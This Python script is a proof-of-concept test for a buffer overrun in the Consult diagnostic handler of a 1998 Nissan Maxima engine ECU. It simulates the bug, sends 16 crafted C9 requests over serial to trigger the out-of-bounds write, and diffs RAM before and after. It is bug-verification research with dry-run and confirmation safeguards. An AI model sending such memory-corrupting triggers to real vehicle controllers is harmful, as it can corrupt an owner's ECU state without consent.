#!/usr/bin/env python3
"""c9_overrun_test: verify the c9_find_hidden buffer overrun (ROM_ANALYSIS.md §10).

Sends 16 C9 addresses all inside $5D40-$623F to trigger the out-of-bounds write
in c9_find_hidden ($543F), then reads back corruption signatures to confirm.

The bug: c9_find_hidden has no upper-bound check on c9_hidden_n ($07E1). The
arrays c9_hidden_addr ($07C3, 2-byte stride) and c9_hidden_idx ($07D7, 1-byte)
hold 10 entries each, but one request can queue 20 addresses in the forwarded
range. At i=15 the 16-bit addr store lands on $07E1 itself, writing attacker-
controlled data (addr - $5000) into c9_hidden_n and the reply cursor $07E2.
The idx store then uses the corrupted n to pick a destination in $07D7-$08D6.

SAFE: the overrun is confined to Consult/active-test state ($07C3-$08D6).
No RAM function pointer exists (ROM_ANALYSIS.md §10), so no code redirect.
Re-init does NOT clear it — only a key cycle does. Run with key on, engine off.

Usage: python3 tools/c9_overrun_test.py [--dev /dev/ttyUSB0] [--dry-run]
"""
import argparse
import datetime
import os
import sys
import time

# Add the project root to the path so we can import consult.
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

from consult.protocol import Consult, ConsultError, ENGINE_IDS
from consult.transport import DEFAULT_DEV, Transport
from consult.experimental import mutation_stream, require_research_ecu

LOG_DIR = os.path.join(ROOT, "logs")

# --- Constants from the disassembly ---

HIDDEN_ADDR_BASE = 0x07C3      # c9_hidden_addr: 10 entries × 2 bytes
HIDDEN_IDX_BASE  = 0x07D7      # c9_hidden_idx:  10 entries × 1 byte
HIDDEN_N         = 0x07E1      # c9_hidden_n (count)
REPLY_CURSOR     = 0x07E2      # used by consult_reply_c9 ($9B3F)
FORWARD_LO       = 0x5D40      # C9 addresses in this range are forwarded
FORWARD_HI       = 0x623F

# RAM regions to dump (contiguous ranges, read via C9 in 8-byte chunks).
# Each: (start, length, label).
DUMP_REGIONS = [
    (0x0740, 0x30, "cs_payload (reply slots, downstream OOB target)"),
    (0x076F, 0x11, "at_values (active test value slots)"),
    (0x07A0, 0x04, "cs_streamlist"),
    (0x07AC, 0x0B, "at_req (active test request flags)"),
    (0x07B7, 0x0C, "at_active (active test active flags)"),
    (0x07C3, 0x14, "c9_hidden_addr[0..9] (10 entries × 2 bytes)"),
    (0x07D7, 0x0A, "c9_hidden_idx[0..9] (10 entries × 1 byte)"),
    (0x07E1, 0x07, "c9_hidden_n / reply cursor / forward state"),
    (0x0810, 0x10, "dtc_seen (redirect target area)"),
]

# Flat list of all addresses to read, and annotations for individual bytes.
ANNOTATIONS = {
    0x0740: "cs_payload[0]",
    0x0767: "cs_payload[39] (end)",
    0x076F: "at_values[0]",
    0x07A0: "cs_streamlist",
    0x07AC: "at_req[0]",
    0x07B7: "at_active[0]",
    0x07C3: "c9_hidden_addr[0] lo",
    0x07C4: "c9_hidden_addr[0] hi",
    0x07D7: "c9_hidden_idx[0]",
    0x07E0: "c9_hidden_idx[9] (last in-bounds)",
    0x07E1: "c9_hidden_n ← OVERWRITTEN at i=15 (lo)",
    0x07E2: "reply cursor ← OVERWRITTEN at i=15 (hi)",
    0x07E3: "forward flag",
    0x07E4: "forward state",
    0x07E5: "forward state",
    0x07E6: "forward state",
    0x07E7: "c9_sub_value",
    0x0810: "dtc_seen[0]",
}


def _build_addrs():
    """Build the sorted flat list of addresses to read from DUMP_REGIONS."""
    addrs = set()
    for start, length, _ in DUMP_REGIONS:
        addrs.update(range(start, start + length))
    return sorted(addrs)

ALL_ADDRS = _build_addrs()


def simulate(addrs):
    """Dry-run the c9_find_hidden loop in Python and return the expected state.

    Models the exact instruction sequence from $543F to $54C6, including the
    m-flag widths (CLM/SEM) confirmed in the disassembly.
    """
    ram = {}

    def rb(addr):
        return ram.get(addr, 0)

    def wb(addr, val):
        ram[addr] = val & 0xFF

    def rw(addr):
        return rb(addr) | (rb(addr + 1) << 8)

    def ww(addr, val):
        wb(addr, val & 0xFF)
        wb(addr + 1, (val >> 8) & 0xFF)

    cs_argc = len(addrs) * 2
    for i, a in enumerate(addrs):
        ww(0x08D2 + 2 * i, a)

    wb(HIDDEN_N, 0)
    old = rb(0x07E3)
    wb(0x07E3, old & ~0x03)

    events = []

    # The real loop is do-while: body runs, THEN 2*(i+1) < cs_argc is checked.
    for i in range(20):
        addr_val = rw(0x08D2 + 2 * i)
        is_hidden = FORWARD_LO <= addr_val < 0x6240
        if not is_hidden:
            pass
        else:
            wb(0x07E3, rb(0x07E3) | 0x01)
            n = rb(HIDDEN_N)
            addr_idx = (2 * n) & 0xFF
            addr_dest = HIDDEN_ADDR_BASE + addr_idx
            stored_word = addr_val - 0x5000
            ww(addr_dest, stored_word)
            events.append(f"  i={i:2d}  n={n:3d}  addr_store: [{addr_dest:04X}] <- "
                          f"${stored_word:04X}  (16-bit)")
            n_reread = rw(HIDDEN_N) & 0xFF
            idx_dest = HIDDEN_IDX_BASE + n_reread
            wb(idx_dest, i)
            events.append(f"         idx_store:  [{idx_dest:04X}] <- ${i:02X}  "
                          f"(8-bit, n_reread=${n_reread:02X})")
            wb(HIDDEN_N, (rb(HIDDEN_N) + 1) & 0xFF)

        if 2 * (i + 1) >= cs_argc:
            break

    return ram, events


def hex_dump(data, base, width=16):
    """Format bytes as a hex dump with address labels."""
    lines = []
    for off in range(0, len(data), width):
        row = data[off:off + width]
        hex_part = " ".join(f"{b:02X}" for b in row)
        lines.append(f"  ${base + off:04X}: {hex_part}")
    return "\n".join(lines)


def annotated_diff(before, after, addrs, sim_ram, addr_trigger):
    """Print a before/after/expected table for every byte that changed, with labels."""
    word = addr_trigger - 0x5000
    lo, hi = word & 0xFF, (word >> 8) & 0xFF
    idx_dest = HIDDEN_IDX_BASE + lo

    # Dynamic annotations based on the trigger address
    dyn = dict(ANNOTATIONS)
    dyn[idx_dest] = dyn.get(idx_dest, "") + f" ← REDIRECT TARGET ($07D7+${lo:02X})"

    lines = []
    lines.append(f"  {'addr':>6s}  {'before':>6s}  {'after':>6s}  {'expect':>6s}  "
                 f"{'':1s}  description")
    lines.append(f"  {'─' * 6}  {'─' * 6}  {'─' * 6}  {'─' * 6}  ─  {'─' * 40}")

    n_changed = 0
    for i, a in enumerate(addrs):
        b, af = before[i], after[i]
        exp = sim_ram.get(a)
        changed = b != af

        if not changed:
            continue
        n_changed += 1

        exp_str = f"${exp:02X}" if exp is not None else "  "
        match = "✓" if exp is not None and af == exp else "~" if exp is not None else " "
        label = dyn.get(a, "")
        lines.append(f"  ${a:04X}   ${b:02X}     ${af:02X}     {exp_str:>4s}  {match}  {label}")

    return n_changed, "\n".join(lines)


def region_dump(data, addrs, title, sim_ram=None):
    """Print a labeled hex dump for each DUMP_REGION."""
    addr_to_val = dict(zip(addrs, data))
    print(f"\n  {title}")
    for start, length, label in DUMP_REGIONS:
        row_addrs = list(range(start, start + length))
        vals = [addr_to_val.get(a) for a in row_addrs]
        # Format in rows of 16
        for row_off in range(0, len(row_addrs), 16):
            chunk_addrs = row_addrs[row_off:row_off + 16]
            chunk_vals = vals[row_off:row_off + 16]
            cells = []
            for a, v in zip(chunk_addrs, chunk_vals):
                if v is None:
                    cells.append("..")
                elif sim_ram and a in sim_ram and v != sim_ram[a]:
                    cells.append(f"\033[1;33m{v:02X}\033[0m")  # yellow = unexpected
                elif sim_ram and a in sim_ram and v == sim_ram[a]:
                    cells.append(f"\033[1;32m{v:02X}\033[0m")  # green = matches model
                else:
                    cells.append(f"{v:02X}")
            addr_label = f"${chunk_addrs[0]:04X}"
            region_tag = f"  ; {label}" if row_off == 0 else ""
            print(f"    {addr_label}: {' '.join(cells)}{region_tag}")


def run_dry(addr):
    """Simulate and print the expected corruption."""
    addrs = [addr] * 16
    word = addr - 0x5000
    lo, hi = word & 0xFF, (word >> 8) & 0xFF

    print(f"=== Dry run: 16 × C9 ${addr:04X} ===")
    print(f"Stored word: ${word:04X} (lo=${lo:02X} hi=${hi:02X})")
    print()

    ram, events = simulate(addrs)
    for e in events:
        print(e)

    print()
    idx_dest = HIDDEN_IDX_BASE + lo
    n_final = ram.get(HIDDEN_N, 0)
    cursor = ram.get(REPLY_CURSOR, 0)
    idx_val = ram.get(idx_dest, None)

    print(f"Key signatures:")
    print(f"  $07E1 (c9_hidden_n):  ${n_final:02X}  (= ${lo:02X}+1 after INC)")
    print(f"  $07E2 (reply cursor): ${cursor:02X}  (= high byte of ${word:04X})")
    print(f"  ${idx_dest:04X} (idx redirect):  "
          f"{'$' + f'{idx_val:02X}' if idx_val is not None else 'unchanged'}  "
          f"(= loop index 15)")
    return ram


def read_addrs(c, addrs):
    """Read a list of addresses via C9 in chunks of 8."""
    result = bytearray()
    for i in range(0, len(addrs), 8):
        chunk = addrs[i:i + 8]
        result += c.read_memory(chunk)
    return bytes(result)


def run_live(dev, addr):
    """Run the overrun on the ECU and show full before/after RAM dumps."""
    trigger_addrs = [addr] * 16
    word = addr - 0x5000
    lo, hi = word & 0xFF, (word >> 8) & 0xFF

    idx_dest = HIDDEN_IDX_BASE + lo
    expected_idx_val = 15

    # Run the simulation for expected values
    sim_ram, _ = simulate(trigger_addrs)

    os.makedirs(LOG_DIR, exist_ok=True)
    log = os.path.join(LOG_DIR, f"{datetime.date.today()}_c9-overrun-test.log")
    t = Transport(dev, log)
    t.note(f"c9_overrun_test addr=${addr:04X} x16")

    try:
        c = Consult(t)
        c.ecu_ids = ENGINE_IDS

        # --- Init ---
        r = c.init()
        if r is None:
            sys.exit("init failed (ignition on?)")
        attempt, secs, junk, ecu = r
        require_research_ecu(c)
        print(f"init ok: id {ecu:02X}, attempt {attempt}, {secs * 1000:.0f} ms")

        # --- Before: read the full region ---
        print(f"\nReading {len(ALL_ADDRS)} bytes across the target region...")
        before = read_addrs(c, ALL_ADDRS)
        t.note(f"before ({len(before)} bytes)")
        region_dump(before, ALL_ADDRS, "BEFORE (baseline)")

        # Check for stale corruption
        before_map = dict(zip(ALL_ADDRS, before))
        if before_map.get(idx_dest) == expected_idx_val:
            print(f"\n  ⚠  ${idx_dest:04X} already = ${expected_idx_val:02X} — "
                  f"stale corruption from a previous run.")
            print(f"      Key-cycle for a clean before/after, or continue to re-confirm.")

        # --- Trigger ---
        print(f"\nSending trigger: 16 × C9 ${addr:04X} + F0...")
        payload = b"".join(bytes([0xC9, addr >> 8, addr & 0xFF])
                          for _ in range(16))
        frames = mutation_stream(c, payload, frames=1, expected_len=16)
        t.note(f"stopped after {len(frames)} frame(s)")
        print(f"  read {len(frames)} frame(s), stopped")

        # --- After: read the full region ---
        print(f"\nReading {len(ALL_ADDRS)} bytes again...")
        after = read_addrs(c, ALL_ADDRS)
        t.note(f"after ({len(after)} bytes)")
        region_dump(after, ALL_ADDRS, "AFTER (post-overrun)", sim_ram)

        # --- Diff ---
        n_changed, diff_text = annotated_diff(before, after, ALL_ADDRS, sim_ram, addr)
        print(f"\n  CHANGED BYTES ({n_changed}):")
        if n_changed:
            print(diff_text)
        else:
            after_map = dict(zip(ALL_ADDRS, after))
            if after_map.get(idx_dest) == expected_idx_val:
                print("  (none — baseline was already corrupted from a previous run)")
            else:
                print("  (none)")

        # --- Re-init and check persistence ---
        print(f"\nRe-init...")
        r = c.init()
        if r:
            post_reinit = read_addrs(c, ALL_ADDRS)
            persisted = sum(1 for b, a, p in zip(before, after, post_reinit)
                           if b != a and a == p)
            cleared = sum(1 for b, a, p in zip(before, after, post_reinit)
                          if b != a and a != p)
            if persisted:
                print(f"  {persisted} corrupted byte(s) PERSIST across re-init "
                      f"(only key cycle clears)")
            if cleared:
                print(f"  {cleared} corrupted byte(s) cleared by re-init")
            if not persisted and not cleared and n_changed == 0:
                print(f"  (no changes to track)")
        else:
            print(f"  re-init failed; turn key off and on")

        # --- Verdict ---
        after_map = dict(zip(ALL_ADDRS, after))
        idx_hit = after_map.get(idx_dest) == expected_idx_val

        print(f"\n{'=' * 60}")
        if idx_hit:
            print("BUG CONFIRMED: c9_find_hidden buffer overrun.")
            print(f"  ${idx_dest:04X} = ${expected_idx_val:02X}: "
                  f"idx store redirected to $07D7+${lo:02X} (n corrupted to ${lo:02X})")
            cursor_val = after_map.get(REPLY_CURSOR)
            if cursor_val == hi:
                print(f"  $07E2 = ${hi:02X}: reply cursor overwritten "
                      f"(high byte of ${word:04X})")
            elif cursor_val != before_map.get(REPLY_CURSOR):
                print(f"  $07E2 = ${cursor_val:02X}: changed (expected ${hi:02X}, "
                      f"reply builder ran once)")
        elif n_changed > 0:
            print("OVERRUN OCCURRED — bytes changed, check the diff above.")
        else:
            print("NO CHANGE — either baseline was already corrupted (key-cycle")
            print("and re-run) or the overrun didn't fire.")
        print(f"{'=' * 60}")

    except (OSError, ValueError) as e:
        print(f"error: {e}")
        raise SystemExit(1) from e
    finally:
        t.close()
        print(f"\nlog: {log}")


def main():
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--dev", default=DEFAULT_DEV,
                    help=f"serial device (default: {DEFAULT_DEV})")
    ap.add_argument("--addr", type=lambda x: int(x, 16), default=0x5D40,
                    help="C9 address to use, in hex (default: 5D40, must be in $5D40-$623F)")
    ap.add_argument("--dry-run", action="store_true",
                    help="simulate only, don't talk to the ECU")
    args = ap.parse_args()

    if not FORWARD_LO <= args.addr <= FORWARD_HI:
        sys.exit(f"address ${args.addr:04X} is outside the forwarded range "
                 f"${FORWARD_LO:04X}-${FORWARD_HI:04X}")

    print("c9_find_hidden buffer overrun test (ROM_ANALYSIS.md §10)")
    print(f"Target ECU: 23710-2L904 (1998 Maxima VQ30DE)")
    print(f"Test address: ${args.addr:04X} × 16")
    print()

    # Always show the dry run first
    expected = run_dry(args.addr)
    print()

    if args.dry_run:
        print("(dry run only, not talking to the ECU)")
        return

    print("-" * 60)
    print("SAFETY: writes to Consult handler state only ($07C3-$08D6).")
    print("No code redirect possible (no RAM function pointers).")
    print("Corruption survives re-init — only key cycle clears it.")
    print("Run with key on, ENGINE OFF.")
    print("-" * 60)
    ok = input("Proceed? [y/N] ")
    if ok.strip().lower() != "y":
        sys.exit("not sent")
    print()
    run_live(args.dev, args.addr)


if __name__ == "__main__":
    main()
